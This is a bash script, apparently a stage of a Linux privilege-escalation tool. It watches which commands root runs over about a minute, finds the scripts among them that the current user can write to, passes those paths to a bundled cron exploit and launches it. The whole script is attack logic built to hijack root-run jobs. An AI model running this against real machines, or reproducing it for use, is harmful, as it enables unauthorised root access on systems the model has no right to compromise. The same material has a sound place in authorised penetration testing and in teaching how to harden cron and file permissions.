#! /bin/bash

EXPLOIT=0
EXPLOITABLE=0
VERBOSE=0

print_verbosity "Monitoring processes that run over the next minute..." 0

# over one minute keep track of all the processes that run
# get any that are run with /bin/* executables 
script_files=$(for i in $(seq 1 610); do ps -u root --format cmd >> /tmp/procs.tmp; sleep 0.1; done; sort /tmp/procs.tmp | uniq -c | grep -v "\[" | grep -v -E "\s*[6-9][0-9][0-9]|\s*[1-9][0-9][0-9][0-9]" | grep "/bin/" | awk '{print $NF}')

print_verbosity "Monitoring complete!" 0

rm /tmp/procs.tmp

writable_files=''

while read file; do
	writable=$(check_writable "$file" "$EXPLOIT")

	if [[ "$writable" = true ]]; then
		print_verbosity "${file} is exploitable!" 1
		writable_files+=${file}':'
		EXPLOITABLE=1
	fi

done <<< "$script_files"

if [[ "$EXPLOITABLE" = 1 ]]; then
	sed -i "s#exploitable\=.*#exploitable\=${writable_files}#g" exploits/cron-exploit.sh
        run_exploit "cron"
else
        test $EXPLOIT != 0 && echo "Not exploitable, skipping exploit."
        exit 0
fi
